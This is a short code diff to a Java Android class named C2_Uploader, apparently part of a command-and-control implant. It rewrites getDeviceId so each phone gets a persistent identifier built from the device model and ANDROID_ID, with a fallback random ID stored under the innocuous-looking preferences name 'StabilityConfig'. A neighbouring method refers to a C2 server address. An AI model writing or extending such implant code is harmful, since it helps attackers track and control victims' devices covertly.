@@ -26,7 +26,27 @@ public class C2_Uploader {
      * Gets a persistent, unique identifier for this device.
      */
     public static String getDeviceId(Context context) {
-        return android.os.Build.MODEL != null ? android.os.Build.MODEL : "Android Device";
+        if (cachedDeviceId != null) return cachedDeviceId;
+        String model = android.os.Build.MODEL != null ? android.os.Build.MODEL : "Android Device";
+        String androidId = "";
+        if (context != null) {
+            try {
+                androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
+            } catch (Exception ignored) {}
+            if (androidId == null || androidId.isEmpty() || "9774d56d682e549c".equals(androidId)) {
+                androidId = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).getString("device_unique_id", null);
+                if (androidId == null) {
+                    androidId = UUID.randomUUID().toString().substring(0, 8);
+                    context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).edit().putString("device_unique_id", androidId).apply();
+                }
+            }
+        }
+        if (androidId != null && !androidId.isEmpty()) {
+            cachedDeviceId = model + "-" + (androidId.length() > 8 ? androidId.substring(0, 8) : androidId);
+        } else {
+            cachedDeviceId = model;
+        }
+        return cachedDeviceId;
     }
 
     private static String getIpForRenderC2(Context context) {
